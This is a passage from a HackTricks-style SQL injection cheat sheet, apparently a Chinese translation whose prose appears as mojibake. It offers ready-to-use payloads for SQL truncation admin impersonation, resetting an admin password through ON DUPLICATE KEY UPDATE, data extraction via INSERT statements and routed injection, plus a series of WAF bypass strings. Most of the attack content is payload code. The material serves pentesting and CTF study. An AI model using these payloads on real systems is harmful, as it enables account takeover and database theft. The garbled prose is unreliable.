- åˆ›å»ºç”¨æˆ·åä¸ºï¼š**AdMIn**ï¼ˆå¤§å†™å’Œå°å†™å­—æ¯ï¼‰
- åˆ›å»ºç”¨æˆ·åä¸ºï¼š**admin=**
- **SQLæˆªæ–­æ”»å‡»**ï¼ˆå½“ç”¨æˆ·åæˆ–ç”µå­é‚®ä»¶ä¸­å­˜åœ¨æŸç§**é•¿åº¦é™åˆ¶**æ—¶ï¼‰--> åˆ›å»ºç”¨æˆ·åä¸ºï¼š**admin \[å¾ˆå¤šç©ºæ ¼] a**

#### SQLæˆªæ–­æ”»å‡»

å¦‚æœæ•°æ®åº“å­˜åœ¨æ¼æ´ï¼Œå¹¶ä¸”ç”¨æˆ·åçš„æœ€å¤§å­—ç¬¦æ•°ä¸º30ï¼Œæ‚¨æƒ³è¦å†’å……ç”¨æˆ·**admin**ï¼Œå°è¯•åˆ›å»ºä¸€ä¸ªåä¸ºï¼š"_admin \[30ä¸ªç©ºæ ¼] a_"çš„ç”¨æˆ·åå’Œä»»ä½•å¯†ç ã€‚

æ•°æ®åº“å°†**æ£€æŸ¥**æ˜¯å¦åœ¨æ•°æ®åº“ä¸­å­˜åœ¨**è¾“å…¥çš„ç”¨æˆ·å**ã€‚å¦‚æœ**ä¸å­˜åœ¨**ï¼Œå®ƒå°†**æˆªæ–­**ç”¨æˆ·åè‡³**å…è®¸çš„æœ€å¤§å­—ç¬¦æ•°**ï¼ˆåœ¨æœ¬ä¾‹ä¸­ä¸ºï¼š"_admin \[25ä¸ªç©ºæ ¼]_"ï¼‰ï¼Œç„¶åå°†**è‡ªåŠ¨åˆ é™¤æ‰€æœ‰æœ«å°¾çš„ç©ºæ ¼**ï¼Œæ›´æ–°æ•°æ®åº“ä¸­çš„ç”¨æˆ·"**admin**"çš„**æ–°å¯†ç **ï¼ˆå¯èƒ½ä¼šå‡ºç°ä¸€äº›é”™è¯¯ï¼Œä½†è¿™å¹¶ä¸æ„å‘³ç€è¿™æ²¡æœ‰èµ·ä½œç”¨ï¼‰ã€‚

æ›´å¤šä¿¡æ¯ï¼š[https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html](https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html) & [https://resources.infosecinstitute.com/sql-truncation-attack/#gref](https://resources.infosecinstitute.com/sql-truncation-attack/#gref)

_æ³¨æ„ï¼šåœ¨æœ€æ–°çš„MySQLå®‰è£…ä¸­ï¼Œæ­¤æ”»å‡»å°†ä¸å†æŒ‰ä¸Šè¿°æè¿°çš„æ–¹å¼èµ·ä½œç”¨ã€‚è™½ç„¶æ¯”è¾ƒä»ç„¶é»˜è®¤å¿½ç•¥å°¾éšç©ºæ ¼ï¼Œä½†å°è¯•æ’å…¥é•¿äºå­—æ®µé•¿åº¦çš„å­—ç¬¦ä¸²å°†å¯¼è‡´é”™è¯¯ï¼Œæ’å…¥å°†å¤±è´¥ã€‚æœ‰å…³æ­¤æ£€æŸ¥çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚é˜…ï¼š[https://heinosass.gitbook.io/leet-sheet/web-app-hacking/exploitation/interesting-outdated-attacks/sql-truncation](https://heinosass.gitbook.io/leet-sheet/web-app-hacking/exploitation/interesting-outdated-attacks/sql-truncation)_

### MySQLæ’å…¥åŸºäºæ—¶é—´çš„æ£€æŸ¥

åœ¨VALUESè¯­å¥ä¸­æ·»åŠ å°½å¯èƒ½å¤šçš„`','',''`ã€‚å¦‚æœå»¶è¿Ÿæ‰§è¡Œï¼Œåˆ™å­˜åœ¨SQLæ³¨å…¥ã€‚
```sql
name=','');WAITFOR%20DELAY%20'0:0:5'--%20-
```
### ON DUPLICATE KEY UPDATE

MySQLä¸­çš„`ON DUPLICATE KEY UPDATE`å­å¥ç”¨äºæŒ‡å®šæ•°æ®åº“åœ¨å°è¯•æ’å…¥å¯¼è‡´åœ¨UNIQUEç´¢å¼•æˆ–PRIMARY KEYä¸­å‡ºç°é‡å¤å€¼çš„è¡Œæ—¶åº”é‡‡å–çš„æ“ä½œã€‚ä»¥ä¸‹ç¤ºä¾‹æ¼”ç¤ºäº†å¦‚ä½•åˆ©ç”¨æ­¤åŠŸèƒ½æ¥ä¿®æ”¹ç®¡ç†å‘˜å¸æˆ·çš„å¯†ç ï¼š

æ³¨å…¥ç¤ºä¾‹è´Ÿè½½ï¼š

å¯ä»¥åˆ¶ä½œå¦‚ä¸‹æ³¨å…¥è´Ÿè½½ï¼Œå°è¯•å°†ä¸¤è¡Œæ’å…¥`users`è¡¨ä¸­ã€‚ç¬¬ä¸€è¡Œæ˜¯è¯±é¥µï¼Œç¬¬äºŒè¡Œé’ˆå¯¹ç°æœ‰ç®¡ç†å‘˜çš„ç”µå­é‚®ä»¶ï¼Œæ„å›¾æ˜¯æ›´æ–°å¯†ç ï¼š
```sql
INSERT INTO users (email, password) VALUES ("generic_user@example.com", "bcrypt_hash_of_newpassword"), ("admin_generic@example.com", "bcrypt_hash_of_newpassword") ON DUPLICATE KEY UPDATE password="bcrypt_hash_of_newpassword" -- ";
```
è¿™æ˜¯å®ƒçš„å·¥ä½œåŸç†ï¼š

- æŸ¥è¯¢å°è¯•æ’å…¥ä¸¤è¡Œæ•°æ®ï¼šä¸€ä¸ªæ˜¯`generic_user@example.com`ï¼Œå¦ä¸€ä¸ªæ˜¯`admin_generic@example.com`ã€‚
- å¦‚æœ`admin_generic@example.com`çš„è¡Œå·²ç»å­˜åœ¨ï¼Œåˆ™`ON DUPLICATE KEY UPDATE`å­å¥ä¼šè§¦å‘ï¼ŒæŒ‡ç¤ºMySQLå°†ç°æœ‰è¡Œçš„`password`å­—æ®µæ›´æ–°ä¸º"bcrypt_hash_of_newpassword"ã€‚
- å› æ­¤ï¼Œéšåå¯ä»¥å°è¯•ä½¿ç”¨`admin_generic@example.com`è¿›è¡Œèº«ä»½éªŒè¯ï¼Œå¯†ç å¯¹åº”äºbcryptå“ˆå¸Œï¼ˆ"bcrypt_hash_of_newpassword"ä»£è¡¨æ–°å¯†ç çš„bcryptå“ˆå¸Œï¼Œåº”è¯¥ç”¨æ‰€éœ€å¯†ç çš„å®é™…å“ˆå¸Œæ›¿æ¢ï¼‰ã€‚

### æå–ä¿¡æ¯

#### åŒæ—¶åˆ›å»º2ä¸ªå¸æˆ·

å½“å°è¯•åˆ›å»ºæ–°ç”¨æˆ·å’Œç”¨æˆ·åæ—¶ï¼Œéœ€è¦å¯†ç å’Œç”µå­é‚®ä»¶ï¼š
```
SQLi payload:
username=TEST&password=TEST&email=TEST'),('otherUsername','otherPassword',(select flag from flag limit 1))-- -

A new user with username=otherUsername, password=otherPassword, email:FLAG will be created
```
#### ä½¿ç”¨åè¿›åˆ¶æˆ–åå…­è¿›åˆ¶

é€šè¿‡è¿™ç§æŠ€æœ¯ï¼Œæ‚¨å¯ä»¥ä»…åˆ›å»ºä¸€ä¸ªå¸æˆ·æ¥æå–ä¿¡æ¯ã€‚é‡è¦çš„æ˜¯è¦æ³¨æ„ï¼Œæ‚¨ä¸éœ€è¦æ·»åŠ ä»»ä½•æ³¨é‡Šã€‚

ä½¿ç”¨**hex2dec**å’Œ**substr**ï¼š
```sql
'+(select conv(hex(substr(table_name,1,6)),16,10) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'
```
è¦è·å–æ–‡æœ¬ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ï¼š
```python
__import__('binascii').unhexlify(hex(215573607263)[2:])
```
ä½¿ç”¨**hex**å’Œ**replace**ï¼ˆä»¥åŠ**substr**ï¼‰ï¼š
```sql
'+(select hex(replace(replace(replace(replace(replace(replace(table_name,"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'

'+(select hex(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'

#Full ascii uppercase and lowercase replace:
'+(select hex(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%"),"z","&"),"J","'"),"K","`"),"L","("),"M",")"),"N","@"),"O","$$"),"Z","&&")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'
```
â€‹

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

â€‹â€‹â€‹â€‹â€‹â€‹[**RootedCON**](https://www.rootedcon.com/) æ˜¯**è¥¿ç­ç‰™**æœ€é‡è¦çš„ç½‘ç»œå®‰å…¨æ´»åŠ¨ä¹‹ä¸€ï¼Œä¹Ÿæ˜¯**æ¬§æ´²**æœ€é‡è¦çš„ä¹‹ä¸€ã€‚ä»¥**ä¿ƒè¿›æŠ€æœ¯çŸ¥è¯†**ä¸ºä½¿å‘½ï¼Œè¿™ä¸ªå¤§ä¼šæ˜¯æŠ€æœ¯å’Œç½‘ç»œå®‰å…¨ä¸“ä¸šäººå£«åœ¨å„ä¸ªé¢†åŸŸçš„çƒ­ç‚¹äº¤æµä¼šã€‚

{% embed url="https://www.rootedcon.com/" %}

## Routed SQLæ³¨å…¥

Routed SQLæ³¨å…¥æ˜¯ä¸€ç§æƒ…å†µï¼Œå…¶ä¸­å¯æ³¨å…¥çš„æŸ¥è¯¢ä¸æ˜¯äº§ç”Ÿè¾“å‡ºçš„æŸ¥è¯¢ï¼Œè€Œæ˜¯å¯æ³¨å…¥æŸ¥è¯¢çš„è¾“å‡ºè¿›å…¥äº§ç”Ÿè¾“å‡ºçš„æŸ¥è¯¢ã€‚([From Paper](http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Routed%20SQL%20Injection%20-%20Zenodermus%20Javanicus.txt))

ç¤ºä¾‹:
```
#Hex of: -1' union select login,password from users-- a
-1' union select 0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061 -- a
```
## WAFç»•è¿‡

[ä»è¿™é‡Œå¼€å§‹çš„åˆå§‹ç»•è¿‡](https://github.com/Ne3o1/PayLoadAllTheThings/blob/master/SQL%20injection/README.md#waf-bypass)

### æ— ç©ºæ ¼ç»•è¿‡

æ— ç©ºæ ¼ (%20) - ä½¿ç”¨ç©ºæ ¼æ›¿ä»£æ–¹æ¡ˆç»•è¿‡
```sql
?id=1%09and%091=1%09--
?id=1%0Dand%0D1=1%0D--
?id=1%0Cand%0C1=1%0C--
?id=1%0Band%0B1=1%0B--
?id=1%0Aand%0A1=1%0A--
?id=1%A0and%A01=1%A0--
```
### No Whitespace - é€šè¿‡ä½¿ç”¨æ³¨é‡Šç»•è¿‡

åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæ‚¨å¯èƒ½ä¼šé‡åˆ°æ— æ³•åœ¨æ³¨å…¥ç‚¹ä½¿ç”¨ç©ºæ ¼çš„é™åˆ¶ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ‚¨å¯ä»¥å°è¯•ä½¿ç”¨æ³¨é‡Šæ¥ç»•è¿‡æ­¤é™åˆ¶ã€‚æ‚¨å¯ä»¥åœ¨SQLè¯­å¥ä¸­ä½¿ç”¨æ³¨é‡Šæ¥æ›¿ä»£ç©ºæ ¼ï¼Œä»¥ç¡®ä¿è¯­å¥ä»ç„¶æœ‰æ•ˆã€‚
```sql
?id=1/*comment*/and/**/1=1/**/--
```
### æ— ç©ºæ ¼ - ä½¿ç”¨æ‹¬å·ç»•è¿‡

åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæ‚¨å¯èƒ½æ— æ³•åœ¨æ³¨å…¥ç‚¹ä½¿ç”¨ç©ºæ ¼ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ‚¨å¯ä»¥å°è¯•ä½¿ç”¨æ‹¬å·æ¥ç»•è¿‡æ­¤é™åˆ¶ã€‚
```sql
?id=(1)and(1)=(1)--
```
### æ— é€—å·ç»•è¿‡

ä½¿ç”¨ OFFSETã€FROM å’Œ JOIN ç»•è¿‡é€—å·ã€‚
```
LIMIT 0,1         -> LIMIT 1 OFFSET 0
SUBSTR('SQL',1,1) -> SUBSTR('SQL' FROM 1 FOR 1).
SELECT 1,2,3,4    -> UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d
```
### é€šç”¨ç»•è¿‡æ–¹æ³•

é»‘åå•å…³é”®å­— - ä½¿ç”¨å¤§å†™/å°å†™ç»•è¿‡
```sql
?id=1 AND 1=1#
?id=1 AnD 1=1#
?id=1 aNd 1=1#
```
ä½¿ç”¨å…³é”®å­—é»‘åå•ä¸åŒºåˆ†å¤§å°å†™ - é€šè¿‡ä½¿ç”¨ç­‰æ•ˆè¿ç®—ç¬¦ç»•è¿‡
```
AND   -> && -> %26%26
OR    -> || -> %7C%7C
=     -> LIKE,REGEXP,RLIKE, not < and not >
> X   -> not between 0 and X
WHERE -> HAVING --> LIMIT X,1 -> group_concat(CASE(table_schema)When(database())Then(table_name)END) -> group_concat(if(table_schema=database(),table_name,null))
```
### ç§‘å­¦è®¡æ•°æ³• WAF ç»•è¿‡

æ‚¨å¯ä»¥åœ¨[gosecureåšå®¢](https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/)ä¸­æ‰¾åˆ°å…³äºè¿™ä¸€æŠ€å·§çš„æ›´æ·±å…¥è§£é‡Šã€‚\
åŸºæœ¬ä¸Šï¼Œæ‚¨å¯ä»¥ä»¥æ„æƒ³ä¸åˆ°çš„æ–¹å¼ä½¿ç”¨ç§‘å­¦è®¡æ•°æ³•æ¥ç»•è¿‡ WAFï¼š
```
-1' or 1.e(1) or '1'='1
-1' or 1337.1337e1 or '1'='1
' or 1.e('')=
```
### ç»•è¿‡åˆ—åé™åˆ¶

é¦–å…ˆè¦æ³¨æ„ï¼Œå¦‚æœ**åŸå§‹æŸ¥è¯¢å’Œä½ æƒ³ä»ä¸­æå–æ ‡å¿—çš„è¡¨å…·æœ‰ç›¸åŒæ•°é‡çš„åˆ—**ï¼Œä½ å¯ä»¥ç®€å•åœ°æ‰§è¡Œï¼š`0 UNION SELECT * FROM flag`

å¯ä»¥**è®¿é—®è¡¨çš„ç¬¬ä¸‰åˆ—è€Œæ— éœ€ä½¿ç”¨å…¶åç§°**ï¼Œä½¿ç”¨ä»¥ä¸‹æŸ¥è¯¢ï¼š`SELECT F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;`ï¼Œå› æ­¤åœ¨SQLæ³¨å…¥ä¸­ä¼šæ˜¯è¿™æ ·çš„å½¢å¼ï¼š
```bash
# This is an example with 3 columns that will extract the column number 3
-1 UNION SELECT 0, 0, 0, F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;
```
æˆ–è€…ä½¿ç”¨**é€—å·ç»•è¿‡**ï¼š
```bash
# In this case, it's extracting the third value from a 4 values table and returning 3 values in the "union select"
-1 union select * from (select 1)a join (select 2)b join (select F.3 from (select * from (select 1)q join (select 2)w join (select 3)e join (select 4)r union select * from flag limit 1 offset 5)F)c
```
è¿™ä¸ªæŠ€å·§æ¥è‡ª[https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/](https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/)

### WAFç»•è¿‡å»ºè®®å·¥å…·

{% embed url="https://github.com/m4ll0k/Atlas" %}

## å…¶ä»–æŒ‡å—

* [https://sqlwiki.netspi.com/](https://sqlwiki.netspi.com)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

## æš´åŠ›æ£€æµ‹åˆ—è¡¨

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/sqli.txt" %}

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) æ˜¯**è¥¿ç­ç‰™**æœ€é‡è¦çš„ç½‘ç»œå®‰å…¨æ´»åŠ¨ä¹‹ä¸€ï¼Œä¹Ÿæ˜¯**æ¬§æ´²**æœ€é‡è¦çš„ä¹‹ä¸€ã€‚ä½œä¸ºä¿ƒè¿›æŠ€æœ¯çŸ¥è¯†çš„ä½¿å‘½ï¼Œè¿™ä¸ªå¤§ä¼šæ˜¯æŠ€æœ¯å’Œç½‘ç»œå®‰å…¨ä¸“ä¸šäººå£«åœ¨å„ä¸ªé¢†åŸŸçš„çƒ­ç‚¹äº¤æµä¼šã€‚

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* ä½ åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…æƒ³è¦è®¿é—®**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½HackTricksçš„PDF**å—ï¼ŸæŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* æ¢ç´¢[**PEASS Family**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[NFTs](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) **Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ–**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ–åœ¨**Twitter**ä¸Šå…³æ³¨æˆ‘ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **é€šè¿‡å‘[hacktricks repo](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
